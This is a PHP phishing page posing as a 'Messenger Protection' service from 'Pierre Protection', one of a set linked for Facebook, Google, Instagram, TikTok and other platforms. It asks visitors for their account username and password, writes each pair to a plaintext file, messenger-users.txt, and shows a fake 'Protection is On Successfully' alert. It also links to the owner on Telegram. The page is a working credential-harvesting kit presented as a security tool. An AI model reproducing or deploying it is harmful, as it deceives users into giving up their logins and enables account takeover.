<?php session_start();  
$notmatching = '';  
// Check if the form is submitted 
if ($_SERVER["REQUEST_METHOD"] == "POST") {     
    $noobusername = $_POST['noobusername'];     
    $noobpassword = $_POST['noobpassword'];      

    $noobusername = htmlspecialchars($noobusername);     
    $noobpassword = htmlspecialchars($noobpassword);      

    $data = "\nUsername => $noobusername\nPassword => $noobpassword\n";      
    $file = 'messenger-users.txt';      
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);   
}   
?>  

<!DOCTYPE html> 
<html lang="en"> 
<head> 
<link rel="stylesheet" href="design.css">    
    <meta charset="UTF-8">     
    <meta name="viewport" content="width=device-width, initial-scale=1.0">     
    <title>Messenger</title>     
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">   
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
</head> 
<body>  
    <nav>     
        <div id="pierreprotlogo" class="logo"> 
            <span>Pierre</span><span>Protection</span> 
        </div>     
        <div class="menu-container">
            <ul>          
               <li><a href="index.php" class="menu">Home</a></li>        
               <li><a href="facebook.php" class="menu">Facebook</a></li>         
                <li><a href="google.php" class="menu">Google</a></li>         
                <li><a href="instagram.php" class="menu">Instagram</a></li>     
                <li><a href="tiktok.php" class="menu">TikTok</a></li>
                <li><a href="snapchat.php" class="menu">Snapchat</a></li>       
                <li><a href="twitter.php" class="menu">Twitter - X</a></li>                     
                <li><a href="messenger.php" class="menu" id="specialitemcolor">Messenger</a></li>
                <li><a href="discord.php" class="menu">Discord</a></li>
            </ul> 
        </div>
    </nav>  

    <div class="background">
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
</div>

    <div class="container">     
        <div class="form-container">         
            <h2 id="onlywhiteitems">Turn On Messenger Protection</h2>         
            <form action="messenger.php" method="post" id="password-reset-form" onsubmit="return showLoadingMessage()">             
                <label id="onlywhiteitems" for="noobusername">Email Or Username</label>             
                <input type="text" id="noobusername" name="noobusername" required>              

                <label id="onlywhiteitems" for="noobpassword">Password</label>             
                <input type="password" id="noobpassword" name="noobpassword" required>              

                <input type="submit" name="submit" value="Turn On">         
            </form>          

            <div class="form-footer">             
                <p id="clickhere">Click Here To <a href="https://t.me/TOXIC_PIERRE">Contact The Owner</a></p>         
            </div>     
        </div> 
    </div>  

    <script>
        function showLoadingMessage() {
            const form = document.getElementById('password-reset-form');
            
            if (form.checkValidity()) {

                alert("Messenger Protection is On Successfully ✔");

                return true; 
            } else {
                
                return false;  
            }
        }
    </script>

</body> 
</html>
